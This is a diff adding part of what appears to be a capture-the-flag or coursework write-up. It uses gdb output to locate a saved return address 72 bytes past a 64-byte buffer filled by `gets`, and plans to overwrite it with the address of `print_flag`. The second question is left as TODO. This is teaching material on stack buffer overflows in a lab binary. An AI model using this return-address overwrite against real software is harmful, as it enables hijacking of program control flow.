@@ -55,4 +55,43 @@ number of characters written so far.
 
 = Part 2
 
+I have to find out where the return address is relative to
+the buffer. `name` is the only local variable/buffer so the
+return address should be 64 bytes away plus 8 bytes for the
+old `%rbp`.
 
+```
+Breakpoint 1, game () at overflow-the-world.c:31
+31	    gets(name);
+(gdb) p &name
+$1 = (char (*)[64]) 0x7fffffffdfb0
+(gdb) p $rsp
+$2 = (void *) 0x7fffffffdfb0
+(gdb) x/16xg $sp
+0x7fffffffdfb0:	0x0000008e00000006	0x0000000000000000
+0x7fffffffdfc0:	0x0000000000000000	0x0000000000000000
+0x7fffffffdfd0:	0x00007fffffffe128	0x0000000000000001
+0x7fffffffdfe0:	0x00007fffffffdff0	0x00000000004012f4
+0x7fffffffdff0:	0x00007fffffffe000	0x0000000000401368
+0x7fffffffe000:	0x00007fffffffe0a0	0x00007ffff7c27675
+0x7fffffffe010:	0x00007ffff7fc2000	0x00007fffffffe128
+0x7fffffffe020:	0x00000001ffffe060	0x000000000040134c
+(gdb) bt
+#0  game () at overflow-the-world.c:31
+#1  0x0000000000401368 in main () at overflow-the-world.c:38
+(gdb) p print_flag
+$3 = {void ()} 0x401236 <print_flag>
+```
+
+Filling the buffer with 72 bytes of padding and then with 0x401236
+will result in `game` returning to `print_flag`.
+
+== Question 1
+
+The return address is 72 bytes away from the `name` buffer.
+I can overwrite the return address with 0x401236 to call
+`print_flag`.
+
+== Question 2
+
+TODO
